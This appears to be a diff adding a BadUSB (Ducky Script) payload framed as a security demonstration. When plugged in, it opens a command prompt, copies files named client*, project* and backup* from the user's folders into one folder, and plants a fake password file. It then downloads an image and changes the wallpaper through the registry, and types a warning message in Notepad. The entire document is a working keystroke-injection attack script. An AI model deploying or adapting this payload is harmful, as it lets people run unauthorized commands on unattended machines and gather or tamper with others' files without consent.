@@ -1,0 +1,59 @@
+REM BadUSB Demo: Open Terminal, Notepad, and type a message
+ATTACKMODE HID STORAGE
+DELAY 2000
+REM Open File Explorer
+WINDOWS e
+DELAY 1000
+REM Open Command Prompt
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+REM Search and copy files named client*, project*, or backup* from Documents, Desktop, and Downloads to Desktop\Do Not Delete
+STRING mkdir "%USERPROFILE%\Desktop\Do Not Delete" & for %i in (client* project* backup*) do (for /r "%USERPROFILE%\Documents" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Desktop" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Downloads" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete")
+ENTER
+DELAY 500
+STRING for %i in (client* project* backup*) do (for /r "%USERPROFILE%\Documents" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Desktop" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Downloads" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete")
+ENTER
+DELAY 1000
+REM Add sample files
+STRING echo ExamplePassword123! > "%USERPROFILE%\Desktop\Do Not Delete\passwords.txt"
+ENTER
+DELAY 500
+STRING echo If you are reading this, you fell for the bait! > "%USERPROFILE%\Desktop\Do Not Delete\README.txt"
+ENTER
+DELAY 500
+REM Change wallpaper to hacker skull
+STRING powershell -command "Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\Desktop\DoNotDeleteWallpaper.jpg; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\Desktop\DoNotDeleteWallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters"
+ENTER
+DELAY 3000
+REM Open Notepad
+WINDOWS r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 1500
+REM Type ASCII "Zero" in Notepad
+STRING  ______   ______   _____    ______
+ENTER
+STRING |___  /  |  ____| |  __ \  |  __  |
+ENTER
+STRING    / /   | |__    | |__) | | |  | | 
+ENTER
+STRING   / /    |  __|   |  _  /  | |  | | 
+ENTER
+STRING  / /__   | |____  | | \ \  | |__| | 
+ENTER
+STRING /_____|  |______| |_|  \_\ |______|
+ENTER
+DELAY 500
+STRING never trust an open machine
+ENTER
+DELAY 500
+STRING *** DEMO: Your files have been copied. This is a security demonstration. ***
+ENTER
+STRING To protect your data, always lock your machine and use strong passwords.
+ENTER
+STRING This was a demo. Next time, don't plug in random USB drives or borrow chargers!
+ENTER
